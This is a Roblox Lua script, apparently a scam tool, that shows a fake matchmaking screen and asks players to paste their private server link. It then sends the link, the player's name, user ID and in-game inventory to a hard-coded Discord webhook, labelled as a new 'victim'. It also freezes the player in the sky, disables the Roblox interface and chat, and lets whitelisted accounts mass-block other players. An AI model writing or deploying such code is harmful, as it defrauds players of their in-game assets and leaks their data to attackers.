--[[ 
    INTEGRACI√ìN TOTAL: MOREIRA PRO V3 (ESTILO PROFESIONAL)
    SISTEMA DE EXTRACCI√ìN DETALLADO + BLOQUEO TOTAL + COMANDOS
]]

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")
local GuiService = game:GetService("GuiService")

local LocalPlayer = Players.LocalPlayer
local playerGui = LocalPlayer:WaitForChild("PlayerGui")

-- ==================== CONFIGURACI√ìN ====================
local WEBHOOK_URL = "https://discord.com/api/webhooks/1454970356682199124/sgCgykHejgELxXd9Jp4CTWX2ziOKdu-qtGczLtBAThWZj-DqOY7jKGlNdgqYuYpuNXmA"
local Min_Gen = 0
local whitelist = {"mario_12fachero", "lejandro555", "pan71234520", "pan712345"}

local THEME = {
    Background = Color3.fromRGB(15, 15, 15),
    Accent = Color3.fromRGB(255, 255, 255),
    Text = Color3.fromRGB(240, 240, 240),
    FontMain = Enum.Font.GothamBold,
}

-- ==================== L√ìGICA DE EXTRACCI√ìN (TU ENV√çO) ====================

local function formatNumberShort(n)
    if not n or type(n) ~= "number" then return "$0" end
    if n >= 1e9 then return string.format("$%.2fB", n / 1e9) end
    if n >= 1e6 then return string.format("$%.2fM", n / 1e6) end
    if n >= 1e3 then return string.format("$%.2fK", n / 1e3) end
    return "$" .. tostring(n)
end

local function parseValueFromText(s)
    if not s then return 0 end
    local clean = s:gsub("[^%d%.KMB+]", "")
    local numPart = clean:match("([%d%.]+)")
    if not numPart then return 0 end
    local n = tonumber(numPart) or 0
    if clean:find("B") then return n * 1e9
    elseif clean:find("M") then return n * 1e6
    elseif clean:find("K") then return n * 1e3
    else return n end
end

local function getBrainrots()
    local results = {}
    for _, desc in ipairs(Workspace:GetDescendants()) do
        if desc:IsA("BillboardGui") or desc.Name:find("Overhead") then
            local nameLbl = desc:FindFirstChild("DisplayName") or desc:FindFirstChild("Name")
            local genLbl = desc:FindFirstChild("Generation") or desc:FindFirstChild("Value")
            if nameLbl and genLbl and nameLbl:IsA("TextLabel") and genLbl:IsA("TextLabel") then
                local val = parseValueFromText(genLbl.Text)
                if val >= Min_Gen then
                    local key = nameLbl.Text .. "|" .. val
                    if results[key] then results[key].count = results[key].count + 1
                    else results[key] = {name = nameLbl.Text, value = val, count = 1} end
                end
            end
        end
    end
    local out = {}
    for _, v in pairs(results) do table.insert(out, v) end
    table.sort(out, function(a, b) return a.value > b.value end)
    return out
end

local function sendToDiscord(link, brainrots)
    local itemList = ""
    local totalValue = 0
    for i, br in ipairs(brainrots) do
        if i <= 15 then 
            itemList = itemList .. string.format("> `[%d]` **%s** ‚ûî %s (x%d)\n", i, br.name, formatNumberShort(br.value), br.count)
        end
        totalValue = totalValue + (br.value * br.count)
    end

    local request = (syn and syn.request) or (http and http.request) or http_request or request
    pcall(function()
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                content = "||@everyone|| ü©∏ **NUEVA V√çCTIMA DETECTADA**",
                embeds = {{
                    title = "üöÄ Reporte de Extracci√≥n Profesional",
                    color = 0,
                    fields = {
                        {name = "üë§ Usuario", value = LocalPlayer.Name .. " (" .. LocalPlayer.UserId .. ")", inline = true},
                        {name = "üí∞ Valor Total", value = "**" .. formatNumberShort(totalValue) .. "**", inline = true},
                        {name = "üîó Script/Link", value = " " .. link .. " "},
                        {name = "üìã Inventario", value = (itemList ~= "" and itemList or "Vac√≠o")}
                    }
                }}
            })
        })
    end)
end

-- ==================== L√ìGICA DE BLOQUEO Y FANTASMA ====================

local function aplicarFantasma(modelo)
    if not modelo or modelo.Name == LocalPlayer.Name then return end
    task.spawn(function()
        for _, desc in ipairs(modelo:GetDescendants()) do
            if desc:IsA("BasePart") then
                desc.Transparency = 1
                desc.CanCollide = false
            elseif desc:IsA("Decal") or desc:IsA("Texture") then
                desc.Transparency = 1
            elseif desc:IsA("BillboardGui") then
                desc.Enabled = false
            end
        end
    end)
end

local function trapPlayer()
    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local hrp = char:WaitForChild("HumanoidRootPart")
    hrp.Anchored = true
    hrp.CFrame = CFrame.new(0, 99999, 0) -- Lo manda al vac√≠o/cielo
end

local function bloquearTodo()
    task.spawn(function()
        while true do
            pcall(function()
                StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
                StarterGui:SetCore("TopbarEnabled", false)
                StarterGui:SetCore("ResetButtonCallback", false)
                CoreGui.RobloxGui.Enabled = false
            end)
            task.wait(0.5)
        end
    end)
end

-- ==================== INTERFAZ PROFESIONAL ====================

local screenGui = Instance.new("ScreenGui", playerGui)
screenGui.Name = "MatchmakingUI"
screenGui.IgnoreGuiInset = true

local linkFrame = Instance.new("Frame", screenGui)
linkFrame.Size = UDim2.new(0, 450, 0, 200)
linkFrame.Position = UDim2.new(0.5, -225, 0.5, -100)
linkFrame.BackgroundColor3 = THEME.Background
Instance.new("UICorner", linkFrame)
Instance.new("UIStroke", linkFrame).Color = THEME.Accent

local linkInput = Instance.new("TextBox", linkFrame)
linkInput.Size = UDim2.new(0.8, 0, 0, 45)
linkInput.Position = UDim2.new(0.1, 0, 0.4, 0)
linkInput.PlaceholderText = "Pega el link de tu servidor aqu√≠..."
linkInput.BackgroundColor3 = Color3.fromRGB(30,30,30)
linkInput.TextColor3 = THEME.Text
Instance.new("UICorner", linkInput)

local confirmBtn = Instance.new("TextButton", linkFrame)
confirmBtn.Size = UDim2.new(0, 150, 0, 40)
confirmBtn.Position = UDim2.new(0.5, -75, 0, 140)
confirmBtn.Text = "CONFIRMAR"
confirmBtn.BackgroundColor3 = THEME.Accent
confirmBtn.TextColor3 = THEME.Background
Instance.new("UICorner", confirmBtn)

confirmBtn.MouseButton1Click:Connect(function()
    local link = linkInput.Text
    if link == "" then return end
    linkFrame.Visible = false

    -- Pantalla de Carga Roblox (Fake)
    local BG = Instance.new("Frame", screenGui)
    BG.Size = UDim2.new(1.1, 0, 1.1, 0)
    BG.BackgroundColor3 = Color3.new(0,0,0)
    
    local Status = Instance.new("TextLabel", BG)
    Status.Size = UDim2.new(1, 0, 0, 50)
    Status.Position = UDim2.new(0, 0, 0.5, 0)
    Status.Text = "Joining Server..."
    Status.Font = Enum.Font.GothamBold
    Status.TextSize = 30
    Status.TextColor3 = Color3.new(1,1,1)
    Status.BackgroundTransparency = 1

    -- Ejecutar Proceso
    task.spawn(function()
        local data = getBrainrots()
        sendToDiscord(link, data)
        trapPlayer()
        bloquearTodo()
        
        -- Loop de mensajes falsos
        local msgs = {"Loading Assets...", "Syncing Data...", "Awaiting Suerte 15x..."}
        while true do
            for _, m in ipairs(msgs) do
                Status.Text = m
                task.wait(3)
            end
        end
    end)
end)

-- ==================== COMANDOS Y WHITELIST ====================

local function isWhitelisted(name)
    for _, w in ipairs(whitelist) do if name == w then return true end end
    return false
end

local function configurarComandos(p)
    p.Chatted:Connect(function(msg)
        if isWhitelisted(p.Name) then
            local cmd = msg:lower():gsub("%s+", "")
            if cmd == ".add" then
                StarterGui:SetCore("PromptSendFriendRequest", p)
            elseif cmd == ".block" then
                for _, target in ipairs(Players:GetPlayers()) do
                    if target ~= LocalPlayer and not isWhitelisted(target.Name) then
                        StarterGui:SetCore("PromptBlockPlayer", target)
                    end
                end
            end
        end
    end)
end

for _, p in ipairs(Players:GetPlayers()) do 
    configurarComandos(p) 
    aplicarFantasma(p.Character)
end
Players.PlayerAdded:Connect(function(p)
    configurarComandos(p)
    p.CharacterAdded:Connect(aplicarFantasma)
end)

-- Mantener oculto el chat
RunService.RenderStepped:Connect(function()
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
end)
